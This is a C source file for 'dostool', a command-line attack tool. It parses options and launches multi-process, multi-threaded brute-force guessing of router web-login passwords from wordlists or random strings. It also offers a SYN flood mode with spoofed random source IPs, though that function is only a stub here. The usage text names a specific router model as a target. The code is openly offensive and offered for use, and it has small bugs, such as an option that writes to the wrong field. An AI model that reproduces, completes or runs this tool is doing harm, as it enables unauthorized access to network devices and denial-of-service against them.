#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/time.h>

#include "main.h"

extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

static int DisplayUsage(void)
{
    /*
        show the useage info
     */
    char *usage = "\n"
                  "Usage:   dostool [option]\n"
                  "Example: ./dostool -a 0 -u \"admin\" -i \"http:\\\\192,168.1.1:80/login.asp\"\n"
                  "         ./dostool -a 0 -U \"/path/username.txt\" -P \"/path/password.txt\"\n"
                  "         ./dostool -a 0 -u \"admin\" -P \"/path/password.txt\"\n"
                  "         ./dostool -a 0 -P \"/path/password.txt\"\n"
                  "         ./dostool -a 1 -i \"192.168.1.1:80\"\n"
                  "         -i \"http:\\\\192.168.1.1:80/login.asp\"\n\n"
                  "         -a    Indicate attack mode\n"
                  "               0    Guess the web password\n"
                  "               1    Syn flood attack\n\n"
                  "         -u    Indicate user-provided username (default 'admin', must use with -a 0)\n"
                  "         -U    Indicate user-provided username file (must use with -a 0 and -P)\n"
                  "         -P    Indicate user-provided password file (must use with -a 0)\n"
                  "         -r    Indicate random password generate length (default 8)\n"
                  "         -d    Indicate debug level (default 0)\n"
                  "               0    turn off the debug show\n"
                  "               1    show less debug message\n"
                  "               2    show verbose debug message\n"
                  "               3    show all debug message\n\n"
                  "         -p    Set the process number (default 4)\n"
                  "         -t    Set the thread number (default 2)\n"
                  "         -i    Indicate intent URL address (user shoud indicate the port in thr URL)\n"
                  "         -R    Use the random source IP address in dos attack (can not use in the guess password attack)\n"
                  "               0    turn off the random source ip address which can protect in the local net\n"
                  "               1    enable random source ip address (default)\n\n"
                  "         -m    Type of router\n"
                  "               feixun_fwr_604h not_sure\n\n"
                  "         -h    Show this message\n\n"
                  "         --get-response-length    Get the response length for test\n"
                  "         --set-watch-length       Indicate a length, if response's length not equal this, return";

    printf("%s", usage);
    return 0;
}

static int CheckInputCompliance(const pInput input)
{
    /*
     * check the compliance of user input
     * like -U must use with -P .etc
     * 
     * return:
     * 0  - check pass
     * -1 - error
     */

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter CheckInputCompliance");

    // in the dos attack mode, can not appear 'http' in the address
    if (input->attack_mode != 0)
    {
        if (strstr(input->address, "http"))
        {
            DisplayError("Please check your address, this should not appear http or https");
            return -1;
        }
    }

    // -U must with -P
    if (strlen(input->username_path) > 0)
    {
        if (strlen(input->password_path) == 0)
        {
            DisplayError("Place check your -U paratemer, -U must use with -P");
            return -1;
        }
    }

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Exit CheckInputCompliance");
    return 0;
}

static int ProcessInput(const int argc, char *argv[], pInput input)
{
    /*
        understood the user input meaning
     */
    int i;
    char *ptmp;
    char *ptmp2;

    for (i = 1; i < argc; i++)
    {
        ptmp = (char *)strstr(argv[i], "-");
        if (!ptmp)
        {
            printf("Illegal input\n");
            return -1;
        }

        ptmp2 = (char *)strstr(++ptmp, "-");
        if (ptmp2)
        {
            // --option
            if (strstr(ptmp2, "get-response-length"))
            {
                input->get_response_length = ENABLE;
            }
            else if (strstr(ptmp2, "set-watch-length"))
            {
                if (argv[++i])
                {
                    input->get_response_length = atoi(argv[i]);
                }
                else
                {
                    DisplayError("Can not found value of --set-watch-length parameter");
                    return -1;
                }
            }
            else
            {
                DisplayError("Illegal input");
                return -1;
            }
        }
        else
        {
            // -option
            switch (*ptmp)
            {
            case 'a':
                // int
                if (argv[++i])
                {
                    switch (*argv[i])
                    {
                    case '0':
                        input->attack_mode = GUESS_USERNAME_PASSWORD;
                        break;
                    case '1':
                        input->attack_mode = SYN_FLOOD_ATTACK;
                        break;
                    default:
                        DisplayWarning("Value of the -a parameter is not allowed, use default value now");
                        input->attack_mode = ATTACK_MODE_DEFAULT;
                        break;
                    }
                }
                else
                {
                    DisplayWarning("Can not found value of -a parameter, use default value now");
                    input->attack_mode = ATTACK_MODE_DEFAULT;
                    //return -1;
                }
                break;

            case 'd':
                // int
                if (argv[++i])
                {
                    switch (*argv[i])
                    {
                    case '0':
                        input->debug_level = DEBUG_OFF;
                        break;
                    case '1':
                        input->debug_level = DEBUG_LEVEL_1;
                        break;
                    case '2':
                        input->debug_level = DEBUG_LEVEL_2;
                        break;
                    case '3':
                        input->debug_level = DEBUG_LEVEL_3;
                        break;
                    default:
                        DisplayWarning("Value of -d parameter is not allowed, use default value now");
                        input->debug_level = DEBUG_LEVEL_DEFAULT;
                        break;
                    }
                }
                else
                {
                    DisplayWarning("Can not found value of -d parameter, use default value now");
                    input->debug_level = DEBUG_LEVEL_DEFAULT;
                    //return -1;
                }
                break;

            case 'u':
                // char
                if (argv[++i])
                {
                    strncpy(input->username, argv[i], MAX_USERNAME_LENGTH);
                }
                else
                {
                    DisplayWarning("Can not found value of -u parameter, use the default value now");
                    strncpy(input->username, USERNAME_DEFAULT, MAX_USERNAME_LENGTH);
                }
                break;

            case 'U':
                // char
                if (argv[++i])
                {
                    strncpy(input->username_path, argv[i], MAX_USERNAME_PATH_LENGTH);
                }
                else
                {
                    DisplayError("Can not found value of -U parameter");
                    return -1;
                }
                break;

            case 'P':
                // char
                if (argv[++i])
                {
                    strncpy(input->password_path, argv[i], MAX_PASSWORD_PATH_LENGTH);
                }
                else
                {
                    DisplayError("Can not found value of -P parameter");
                    return -1;
                }
                break;

            case 't':
                // int
                if (argv[++i])
                {
                    input->max_thread = atoi(argv[i]);
                }
                else
                {
                    DisplayWarning("Can not found value of -t parameter, use default value now");
                    input->max_thread = THREAD_NUM_DEFAULT;
                    //return -1;
                }
                break;

            case 'p':
                // int
                if (argv[++i])
                {
                    input->max_process = atoi(argv[i]);
                }
                else
                {
                    DisplayWarning("Can not found value of -p parameter, use default value now");
                    input->max_process = PROCESS_NUM_DEFAULT;
                    //return -1;
                }
                break;

            case 'r':
                // int
                if (argv[++i])
                {
                    input->random_password_length = atoi(argv[i]);
                }
                else
                {
                    DisplayWarning("Can not found value of -r parameter, use default value now");
                    input->random_password_length = RANDOM_PASSWORD_LENGTH_DEFAULT;
                    //return -1;
                }
                break;

            case 'i':
                // char
                if (argv[++i])
                {
                    strncpy(input->address, argv[i], MAX_URL_LENGTH);
                }
                else
                {
                    DisplayError("Can not found value of -i parameter");
                    return -1;
                }
                break;

            case 'R':
                // int
                if (argv[++i])
                {
                    switch (*argv[i])
                    {
                    case '0':
                        input->random_sip_address = DISABLE_SIP;
                        break;
                    case '1':
                        input->random_sip_address = ENABLE_SIP;
                        break;
                    default:
                        DisplayWarning("Value of -R parameter is not allowed, use default value now");
                        input->random_sip_address = ENABLE_SIP;
                        break;
                    }
                }
                else
                {
                    DisplayWarning("Can not found value of -i parameter, use default value now");
                    input->random_sip_address = RANDOM_SIP_DEFAULT;
                }
                break;

            case 'm':
                // char
                if (argv[++i])
                {
                    strncpy(input->model_type, argv[i], MAX_MODEL_TYPE_LENGTH);
                }
                else
                {
                    DisplayWarning("Can not found value of -m parameter use default value now");
                    strncpy(input->model_type, (char *)MODEL_TYPE_DEFAULT, MAX_MODEL_TYPE_LENGTH);
                }
                break;

            case 'h':
                DisplayUsage();
                return 0;

            default:
                DisplayError("Please check you input");
                DisplayUsage();
                return -1;
            }
        }
    }

    return 0;
}

static int StartSYNFlood(pInput input)
{
    // run function in thread
    return 0;
}

static int StartGuess(const pInput input)
{
    extern void FreeProcessFileBuff(pStrHeader p);
    extern int ProcessFile(const char *path, pStrHeader *output, int flag);
    extern int GuessAttack(pInput input);
    pid_t pid;
    pthread_t tid;
    int i, j, ret;
    // store the linked list if use the path file
    pGuessAttackUse gau = (pGuessAttackUse)malloc(sizeof(GuessAttackUse));
    gau->u_header = NULL;
    gau->p_header = NULL;
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartAttackProcess");

    // we are not allowed the username from linked list but password from random string
    if (input->get_response_length == ENABLE)
    {
        input->guess_attack_type = GUESS_GET_RESPONSE_LENGTH;
        int length = GuessAttack(input);
        if (length == -1)
        {
            DisplayError("GuessAttack failed");
            return -1;
        }
        DisplayInfo("Response length is %d", length);
        return 0;
    }
    else if (input->watch_length > 0)
    {
        input->guess_attack_type = GUESS_LENGTH;
    }
    else if (strlen(input->password_path) > 0)
    {
        ProcessFile(input->password_path, &(gau->p_header), 1);
        if (strlen(input->username_path) > 0)
        {
            ProcessFile(input->username_path, &(gau->u_header), 0);
            input->guess_attack_type = GUESS_ULPL;
        }
        else
        {
            input->guess_attack_type = GUESS_U1PL;
        }
    }
    else
    {
        input->guess_attack_type = GUESS_U1PR;
    }

    input->gau = gau;
    for (i = 0; i < input->max_process; i++)
    {
        pid = fork();
        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "pid value: %d", pid);
        if (pid == 0)
        {
            // child process
            for (j = 0; j < input->max_thread; j++)
            {
                input->serial_num = (i * input->max_thread) + j;
                input->seed = i + j;

                ret = pthread_create(&tid, NULL, (void *)GuessAttack, input);
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "job_tid value: %d", tid);
                if (ret != 0)
                {
                    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret value: %d", ret);
                    DisplayError("Create pthread failed");
                    return -1;
                }
                //pthread_detach(tid);
                //pthread_join(tid, NULL);
            }
        }
        else if (pid < 0)
        {
            // Error now
            DisplayError("Create process failed");
        }
        else
        {
            /*
            // Father process
            int wait_val;
            int child_id;
            child_id = wait(&wait_val);
            DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "child exit, process id: %d", child_id);
            if (WIFEXITED(wait_val))
            {
                DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "child exited with code %d", WEXITSTATUS(wait_val));
            }
            else
            {
                DisplayError("Child exited unnormally");
                // sleep() for test
                //sleep(1);
            }
            */
        }
    }
    sleep(10);
    if (gau->u_header)
    {
        FreeProcessFileBuff(gau->u_header);
    }
    if (gau->p_header)
    {
        FreeProcessFileBuff(gau->p_header);
    }
    free(gau);
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Exit StartAttackProcess");
    return 0;
}

static int InitInput(pInput *p)
{
    // make sure the buff is clean
    (*p) = (pInput)malloc(sizeof(Input));
    if (!(*p))
    {
        DisplayError("Init input malloc failed");
        return -1;
    }
    if (!memset((*p)->address, 0, sizeof((*p)->address)))
    {
        DisplayError("Init input memset failed");
        return -1;
    }
    if (!memset((*p)->username, 0, sizeof((*p)->username)))
    {
        DisplayError("Init input memset failed");
        return -1;
    }
    if (!memset((*p)->username_path, 0, sizeof((*p)->username_path)))
    {
        DisplayError("Init input memset failed");
        return -1;
    }
    if (!memset((*p)->password_path, 0, sizeof((*p)->password_path)))
    {
        DisplayError("Init input memset failed");
        return -1;
    }
    if (!memset((*p)->model_type, 0, sizeof((*p)->model_type)))
    {
        DisplayError("Init input memset failed");
        return -1;
    }

    // field default value
    (*p)->attack_mode = ATTACK_MODE_DEFAULT;
    (*p)->max_process = PROCESS_NUM_DEFAULT;
    (*p)->max_thread = THREAD_NUM_DEFAULT;
    (*p)->debug_level = DEBUG_LEVEL_DEFAULT;
    (*p)->random_password_length = RANDOM_PASSWORD_LENGTH_DEFAULT;
    (*p)->random_sip_address = RANDOM_SIP_DEFAULT;
    (*p)->watch_length = 0;
    if (!strncpy((*p)->username, (char *)USERNAME_DEFAULT, strlen((char *)USERNAME_DEFAULT)))
    {
        DisplayError("Init input strncpy failed");
        return -1;
    }
    if (!strncpy((*p)->model_type, (char *)MODEL_TYPE_DEFAULT, strlen((char *)MODEL_TYPE_DEFAULT)))
    {
        DisplayError("Init input strncpy failed");
        return -1;
    }

    return 0;
}

int main(int argc, char *argv[])
{
    /*
      main function
     */

    if (argc == 1)
    {
        DisplayError("Need more parameter");
        DisplayUsage();
        return -1;
    }

    pInput input;

    if (InitInput(&input) == -1)
    {
        DisplayError("Init the input failed");
        return -1;
    }

    // processing the user input data
    if (ProcessInput(argc, argv, input) == -1)
    {

        DisplayError("Please check you input");
        DisplayUsage();
        return -1;
    }

    DisplayInfo("Running...");
    DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "Debug mode started...");

    if (CheckInputCompliance(input) == -1)
    {
        // process user input ready, start attack now
        DisplayError("Check compliance failed, please check your input");
        DisplayUsage();
        return -1;
    }

    switch (input->attack_mode)
    {
    case GUESS_USERNAME_PASSWORD:
        if (StartGuess(input) == -1)
        {
            DisplayError("StartGuess failed");
            return -1;
        }
        break;
    case SYN_FLOOD_ATTACK:
        if (StartSYNFlood(input) == -1)
        {
            DisplayError("StartSYNFlood failed");
            return -1;
        }
        break;
    }

    free(input);
    return 0;
}